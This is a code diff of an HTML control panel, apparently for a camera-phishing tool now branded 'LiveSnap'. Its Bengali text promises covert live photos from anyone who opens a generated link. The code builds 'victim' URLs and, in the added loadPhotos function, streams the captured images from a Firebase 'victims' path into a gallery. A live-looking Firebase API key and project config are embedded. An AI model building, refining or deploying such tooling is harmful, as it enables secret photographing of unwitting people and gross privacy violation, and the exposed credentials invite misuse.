@@ -3,152 +3,189 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>LensCam • গোপন লিংক তৈরি করুন</title>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
+  <title>LiveSnap • গোপন ছবি লাইভ দেখুন</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700;800&display=swap" rel="stylesheet">
   <style>
-    :root {
-      --bg: #0a0a0f;
-      --primary: #00ff9d;
-      --accent: #ff00ff;
-      --text: #e0e0e0;
-    }
     * { margin:0; padding:0; box-sizing:border-box; }
     body {
-      background: var(--bg);
-      color: var(--text);
-      font-family: 'Rajdhani', sans-serif;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(to bottom, #f8f9fa, #ffffff);
+      color: #222;
       min-height: 100vh;
-      background: radial-gradient(circle at 50% 50%, #1a0033, #0a0a0f);
-      overflow-x: hidden;
+    }
+    header {
+      background: #000;
+      padding: 30px 0;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
     }
     .logo {
-      width: 120px;
-      height: 120px;
-      margin: 30px auto;
-      animation: float 6s ease-in-out infinite;
+      height: 100px;
+      border-radius: 50%;
+      border: 5px solid #ff0050;
+      box-shadow: 0 0 30px rgba(255,0,80,0.5);
+      animation: glow 4s infinite alternate;
     }
-    @keyframes float {
-      0%,100% { transform: translateY(0px); }
-      50% { transform: translateY(-20px); }
+    @keyframes glow {
+      from { box-shadow: 0 0 30px rgba(255,0,80,0.5); }
+      to { box-shadow: 0 0 50px rgba(255,0,80,0.8); }
+    }
+    .container {
+      max-width: 900px;
+      margin: 50px auto;
+      padding: 20px;
+      text-align: center;
     }
     h1 {
-      font-family: 'Orbitron', sans-serif;
       font-size: 3.5em;
-      text-align: center;
-      background: linear-gradient(90deg, var(--primary), var(--accent));
+      margin: 20px 0;
+      background: linear-gradient(90deg, #ff0050, #ff4500);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
-      margin: 20px 0;
-      text-shadow: 0 0 30px rgba(0,255,157,0.5);
+      font-weight: 800;
     }
     p {
-      text-align: center;
       font-size: 1.4em;
-      max-width: 700px;
+      color: #444;
       margin: 20px auto;
-      opacity: 0.9;
+      max-width: 750px;
     }
     .thumb {
-      width: 90%;
-      max-width: 600px;
+      width: 100%;
+      max-width: 650px;
       border-radius: 20px;
-      border: 3px solid var(--primary);
-      box-shadow: 0 0 40px rgba(0,255,157,0.4);
       margin: 40px auto;
-      display: block;
-      animation: pulse-glow 4s infinite;
-    }
-    @keyframes pulse-glow {
-      0%,100% { box-shadow: 0 0 40px rgba(0,255,157,0.4); }
-      50% { box-shadow: 0 0 70px rgba(255,0,255,0.6); }
+      box-shadow: 0 15px 40px rgba(0,0,0,0.15);
+      border: 3px solid #eee;
     }
     .btn {
-      background: linear-gradient(45deg, var(--primary), var(--accent));
-      color: #000;
-      padding: 18px 50px;
-      font-size: 1.4em;
+      background: #ff0050;
+      color: white;
+      padding: 18px 55px;
+      font-size: 1.5em;
       font-weight: bold;
       border: none;
       border-radius: 50px;
       cursor: pointer;
-      margin: 20px 10px;
-      box-shadow: 0 0 30px rgba(0,255,157,0.5);
-      transition: all 0.4s;
+      margin: 15px;
+      transition: all 0.3s;
+      box-shadow: 0 10px 30px rgba(255,0,80,0.4);
     }
     .btn:hover {
-      transform: translateY(-8px) scale(1.05);
-      box-shadow: 0 0 50px rgba(255,0,255,0.7);
+      transform: translateY(-6px);
+      box-shadow: 0 20px 40px rgba(255,0,80,0.5);
     }
     #linkBox {
       margin: 50px auto;
-      padding: 30px;
-      max-width: 700px;
-      background: rgba(20,20,40,0.7);
+      padding: 35px;
+      background: white;
       border-radius: 20px;
-      border: 2px dashed var(--primary);
-      backdrop-filter: blur(10px);
+      max-width: 750px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+      border: 2px dashed #ff0050;
       display: none;
-      animation: fadeIn 1s;
     }
     #victimLink {
       width: 100%;
       padding: 18px;
-      background: #111;
-      border: 2px solid var(--primary);
+      font-size: 1.3em;
+      border: 2px solid #ddd;
       border-radius: 15px;
-      color: var(--primary);
-      font-size: 1.1em;
+      background: #fff8f8;
       text-align: center;
       margin: 20px 0;
+      color: #d00040;
+      font-weight: bold;
       word-break: break-all;
+    }
+    .gallery-section {
+      margin-top: 80px;
+      padding: 40px 20px;
+      background: #f8f9fa;
+      border-radius: 20px;
+      box-shadow: inset 0 5px 20px rgba(0,0,0,0.05);
+    }
+    .gallery-section h2 {
+      font-size: 2.2em;
+      margin-bottom: 30px;
+      color: #ff0050;
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 20px;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    .grid img {
+      width: 100%;
+      height: 200px;
+      object-fit: cover;
+      border-radius: 15px;
+      border: 4px solid #ff0050;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+      transition: 0.3s;
+      cursor: pointer;
+    }
+    .grid img:hover {
+      transform: scale(1.05);
+      box-shadow: 0 15px 40px rgba(255,0,80,0.4);
+    }
+    .no-photos {
+      text-align: center;
+      font-size: 1.6em;
+      color: #888;
+      padding: 60px;
     }
     footer {
       text-align: center;
-      padding: 40px;
+      padding: 50px;
+      background: #000;
+      color: white;
+      margin-top: 100px;
       font-size: 1.2em;
-      color: #aaa;
-      margin-top: 80px;
     }
-    footer span { color: var(--primary); font-weight: bold; }
+    footer a { color: #ff0050; text-decoration: none; font-weight: bold; }
   </style>
 </head>
 <body>
 
-<!-- লেন্সক্যাম স্টাইল SVG লোগো -->
-<svg class="logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-  <circle cx="50" cy="50" r="45" fill="none" stroke="#00ff9d" stroke-width="4"/>
-  <circle cx="50" cy="50" r="30" fill="none" stroke="#ff00ff" stroke-width="6"/>
-  <circle cx="50" cy="50" r="15" fill="#00ff9d" opacity="0.3"/>
-  <circle cx="60" cy="40" r="12" fill="#ff00ff"/>
-  <circle cx="62" cy="38" r="5" fill="#fff"/>
-</svg>
+<header>
+  <img src="https://i.ibb.co.com/5YZpX7K/logo.png" alt="LiveSnap" class="logo">
+</header>
 
-<h1>LENS CAM</h1>
-<p>যে কেউ লিংক ওপেন করলেই তার ফ্রন্ট + ব্যাক ক্যামেরা দিয়ে ১০টা ছবি সাথে সাথে চলে আসবে!</p>
+<div class="container">
+  <h1>গোপনে লাইভ ছবি দেখুন</h1>
+  <p>যে কেউ লিংকে ক্লিক করলেই তার ফোনের ক্যামেরা থেকে ছবি সাথে সাথে এখানে চলে আসবে!</p>
+  
+  <img src="https://i.ibb.co.com/4pJ3T1F/thumb.jpg" alt="Demo" class="thumb">
 
-<img src="https://i.ibb.co.com/4pJ3T1F/thumb.jpg" alt="Demo" class="thumb">
+  <button class="btn" onclick="generateLink()">নতুন গোপন লিংক তৈরি করুন</button>
 
-<button class="btn" onclick="generateLink()">নতুন গোপন লিংক তৈরি করুন</button>
+  <div id="linkBox">
+    <h2 style="color:#ff0050; margin-bottom:20px;">তোমার লিংক রেডি!</h2>
+    <input type="text" id="victimLink" readonly />
+    <br><br>
+    <button class="btn" onclick="copyLink()">কপি করুন</button>
+  </div>
 
-<div id="linkBox">
-  <h2 style="text-align:center; color:var(--primary);">তোমার লিংক রেডি!</h2>
-  <input type="text" id="victimLink" readonly />
-  <br><br>
-  <button class="btn" onclick="copyLink()">কপি করুন</button>
-  <button class="btn" onclick="openDashboard()" style="background:#ff00ff; color:white;">ভিউ করুন (লাইভ ড্যাশবোর্ড)</button>
+  <div class="gallery-section">
+    <h2>লাইভ ছবি গ্যালারি</h2>
+    <div class="no-photos" id="noPhotos">কোনো ছবি এখনো আসেনি। লিংক শেয়ার করুন!</div>
+    <div class="grid" id="gallery"></div>
+  </div>
 </div>
 
 <footer>
-  © 2025 COPYRIGHT BY <span>X4XOR</span> · ATI LINKABLE THAKBE
+  © 2025 COPYRIGHT BY <a href="#">X4XOR</a> · ATI LINKABLE THAKBE
 </footer>
 
-<!-- Firebase SDK -->
+<!-- Firebase -->
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
 
 <script>
-// তোমার রিয়েল কনফিগ
 const firebaseConfig = {
   apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
   authDomain: "cam-snap-8e956.firebaseapp.com",
@@ -161,16 +198,21 @@ const firebaseConfig = {
 };
 
 firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
 
 let currentId = null;
 
 function generateLink() {
   currentId = Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
   const base = location.href.split('/').slice(0, -1).join('/') + '/';
-  const victimUrl = base + "victim.html?id=" + currentId;
+  const victimUrl = base + "view.html?id=" + currentId;
 
   document.getElementById("linkBox").style.display = "block";
   document.getElementById("victimLink").value = victimUrl;
+
+  document.getElementById("gallery").innerHTML = "";
+  document.getElementById("noPhotos").style.display = "block";
+  loadPhotos(currentId);
 }
 
 function copyLink() {
@@ -180,9 +222,24 @@ function copyLink() {
   alert("লিংক কপি হয়ে গেছে!");
 }
 
-function openDashboard() {
-  if (!currentId) return alert("প্রথমে লিংক তৈরি করুন!");
-  window.open("dashboard.html?id=" + currentId, "_blank");
+function loadPhotos(id) {
+  if (!id) return;
+  db.ref(`victims/${id}`).on('value', snap => {
+    const gallery = document.getElementById('gallery');
+    const noPhotos = document.getElementById('noPhotos');
+    gallery.innerHTML = '';
+
+    if (snap.val()) {
+      noPhotos.style.display = 'none';
+      const photos = Object.values(snap.val()).sort((a,b) => b.time - a.time);
+      photos.forEach(p => {
+        const img = document.createElement('img');
+        img.src = p.url;
+        img.onclick = () => window.open(p.url, '_blank');
+        gallery.appendChild(img);
+      });
+    }
+  });
 }
 </script>
 </body>
